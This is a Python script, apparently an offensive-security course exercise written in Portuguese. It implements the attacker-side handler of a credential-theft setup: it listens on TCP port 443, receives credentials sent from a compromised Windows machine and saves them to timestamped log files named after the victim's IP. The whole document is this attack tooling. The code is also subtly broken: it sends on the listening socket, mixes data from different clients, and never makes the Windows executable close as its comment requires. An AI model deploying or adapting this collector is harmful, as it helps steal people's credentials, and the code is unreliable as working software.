#!/usr/bin/python3

'''
6 - Faça com que o handler armazene as credenciais recebidas
no arquivo de log e após o recebimento das credenciais faça
com que o executável seja encerrado no windows. 
'''

import socket
import sys
from datetime import datetime

lhost = "0.0.0.0"
lport = 443
buff = 1024
date = datetime.now()

def log(buffer, ip):
    with open("log-"+date.strftime('%d%m%Y-%H%M')+"-"+ip+".txt","w") as log:
        log.write(buffer)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((lhost,lport))
server.listen(1)

print("[+] Iniciando handler...")

creds = ""
while True:
    clientsocket, clientaddr = server.accept()
    print("[+] Recebendo conexao de " + clientaddr[0]+ "\n")
    stop = True
    clientsocket.settimeout(3)
    while True:
        try:
            for i in range(500):
                data = clientsocket.recv(buff)
                if len(data) < 1:
                    break
                data = data.decode()
                creds += data
            log(creds, clientaddr[0])
            server.send(b"")
        except:
            server.close()
            sys.exit()

server.close()

